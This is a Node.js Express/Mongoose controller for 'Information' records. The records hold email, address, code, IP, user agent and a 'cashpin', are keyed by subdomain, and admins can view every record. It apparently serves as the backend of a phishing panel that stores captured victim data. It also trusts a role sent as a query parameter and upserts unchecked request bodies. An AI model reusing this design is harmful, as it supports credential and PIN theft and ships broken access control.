const { default: mongoose } = require("mongoose");
const InformationModel = require("../models/information");




// Get all users
const getAllInformations = async (req, res) => {
  try {
    const { id, role } = req.query;
    // console.log(req.query);
    let informations;
    if (role === "admin") {
      informations = await InformationModel.find().populate('userId').sort({ createdAt: -1 }); // Fetch all users
    } else {
      informations = await InformationModel.find({ userId: id }).populate('userId').sort({ createdAt: -1 });
    }
    // console.log(informations);
    // const informations = await InformationModel.find().populate('userId').sort({ createdAt: -1 }); // Fetch all users
    if (informations.length === 0) {
      // If no users are found, send a 404 response with a custom message
      return res.status(200).json({
        success: false,
        message: "No informations found!!!",
        data: []

      });
    }

    // Send the list of users if found
    // res.status(200).json(users);
    return res.status(200).json({
      success: true,
      message: "Informations fetched successful!",
      data: informations

    });
  } catch (error) {
    console.error('Error fetching informations:', error);
    return res.status(500).json({
      success: false,
      message: "Something went wrong!",
    });
  }
};

// Controller to create a new information entry
const createInformation = async (req, res) => {
  try {
    // Extract data from the request body
    const { site, email, address, code, ip, agent, userId, temp } = req.body;

    // Validate required fields
    // if (!email || !address || !code || !ip || !agent || !userId) {
    //     return res.status(400).json({
    //         success: false,
    //         message: "All fields are required!",
    //         data: []
    //     });
    // }

    // Create a new information entry
    const newInformation = new InformationModel({
      site,
      email,
      address,
      code,
      ip,
      agent,
      userId,
      temp
    });

    // Save the entry to the database
    await newInformation.save();

    // Respond with success
    return res.status(201).json({
      success: true,
      message: "Information created successfully!",
      data: newInformation
    });
  } catch (error) {
    // Handle errors
    console.error(error);
    return res.status(500).json({
      success: false,
      message: "An error occurred while creating information!",
      error: error.message
    });
  }
};


const updateInformation = async (req, res) => {
  const { id } = req.params; // Extract the subdomain ID from params
  const updatedInformation = req.body; // Extract the type (desktop or mobile) from the request body
  // console.log(id, address);
  try {
    // Build the update object based on the type
    

    // Find and update the document
    const result = await InformationModel.findOneAndUpdate(
      { temp: id }, // Filter by subdomain
      updatedInformation, // Increment the desktop or mobile counter
      { new: true, upsert: true } // Return the updated document, create if not found
    );

    // If no document is updated or created, handle it
    if (!result) {
      return res.status(404).json({
        success: false,
        message: "Subdomain not found!",
      });
    }

    // Send success response with the updated document
    return res.status(200).json({
      success: true,
      message: "Click updated successfully!",
      data: result,
    });
  } catch (error) {
    console.error('Error updating click:', error);

    // Handle server errors
    return res.status(500).json({
      success: false,
      message: "Something went wrong!",
    });
  }
};
const updateCashpin = async (req, res) => {
  const { id } = req.params; // Extract the subdomain ID from params
  const { cashpin } = req.body; // Extract the type (desktop or mobile) from the request body
  console.log(id, cashpin);
  try {
    // Build the update object based on the type
    const update = {
      cashpin: cashpin
    };

    // Find and update the document
    const result = await InformationModel.findOneAndUpdate(
      { temp: id }, // Filter by subdomain
      update, // Increment the desktop or mobile counter
      { new: true, upsert: true } // Return the updated document, create if not found
    );

    // If no document is updated or created, handle it
    if (!result) {
      return res.status(404).json({
        success: false,
        message: "Subdomain not found!",
      });
    }

    // Send success response with the updated document
    return res.status(200).json({
      success: true,
      message: "Cashpin updated successfully!",
      data: result,
    });
  } catch (error) {
    console.error('Cashpin updating click:', error);

    // Handle server errors
    return res.status(500).json({
      success: false,
      message: "Something went wrong!",
    });
  }
};

const deleteInformation = async (req, res) => {
  const { id } = req.params; // Extract the object ID from params
  try {
    // Find and delete the document by objectId
    const result = await InformationModel.findOneAndDelete({ _id: new mongoose.Types.ObjectId(id) });
    // console.log(result);
    // If no document is deleted, handle it
    if (!result) {
      return res.status(404).json({
        success: false,
        message: "Information not found!",
      });
    }

    // Send success response
    return res.status(200).json({
      success: true,
      message: "Information deleted successfully!",
      data: result,
    });
  } catch (error) {
    console.error('Error deleting Information:', error);

    // Handle server errors
    return res.status(500).json({
      success: false,
      message: "Something went wrong!",
    });
  }
};


module.exports = {
  getAllInformations,
  createInformation,
  updateInformation,
  updateCashpin,
  deleteInformation
};
